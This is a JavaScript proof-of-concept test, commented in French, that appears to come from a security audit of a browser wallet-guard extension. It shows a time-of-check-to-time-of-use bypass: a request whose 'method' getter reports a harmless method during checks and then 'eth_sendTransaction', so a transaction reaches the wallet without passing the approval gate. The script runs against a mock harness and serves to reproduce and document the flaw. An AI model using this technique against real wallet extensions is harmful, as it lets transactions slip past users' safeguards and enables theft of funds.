// T01 - TOCTOU sur l'objet de requete : un getter 'method' renvoie une methode inoffensive pendant la verification,
// puis eth_sendTransaction quand le portefeuille relit l'objet d'origine. inject.js transmet `args` (objet de la page) au lieu de la copie `full` pour les methodes non surveillees.
// Preuve : inject.js:137-142 (rApply(t, thisArg, args) ligne 142) et :172-175 / :194 pour send / sendAsync.
import { makeWindow, TX } from './harness_inject.mjs';
const w = await makeWindow();
const seen = [];                                  // ce que le "portefeuille" recoit reellement
w.sandbox.__wallet = { request(a) { seen.push(JSON.stringify({ method: a.method, params: a.params })); return Promise.resolve('0xresult'); } };
w.run('globalThis.ethereum = globalThis.__wallet;');
w.sandbox.__tx = TX;
// requete piegee : les 3 premieres lectures de .method (typeof, String(), JSON.stringify) voient une methode non surveillee.
w.run(`globalThis.__req = (() => { let n = 0; const tx = globalThis.__tx; return { get method() { n++; return n <= 3 ? 'eth_chainId' : 'eth_sendTransaction'; }, params: [tx] }; })();`);
await w.run('globalThis.ethereum.request(globalThis.__req)');
console.log('demandes de decision (gate) envoyees au pont :', w.gates.length);
console.log('ce que le portefeuille a recu                  :', seen);
const bypass = w.gates.length === 0 && seen.some((s) => JSON.parse(s).method === 'eth_sendTransaction');
// controle positif : la meme transaction envoyee honnetement DOIT etre soumise au pont
const w2 = await makeWindow({ decide: () => ({ allow: false, reason: 'denied' }) });
w2.sandbox.__wallet = { request() { return Promise.resolve('0xresult'); } };
w2.run('globalThis.ethereum = globalThis.__wallet;'); w2.sandbox.__tx = TX;
let denied = false; try { await w2.run('globalThis.ethereum.request({method:"eth_sendTransaction", params:[globalThis.__tx]})'); } catch (e) { denied = true; }
console.log('controle positif (requete honnete bloquee quand le pont refuse) :', denied, '| gates:', w2.gates.length);
console.log(bypass ? 'VULNERABLE : eth_sendTransaction atteint le portefeuille sans passer par Hold up.' : 'OK : pas de contournement.');
w.close(); w2.close();
process.exit(bypass && denied ? 0 : 1);   // 0 = probleme reproduit
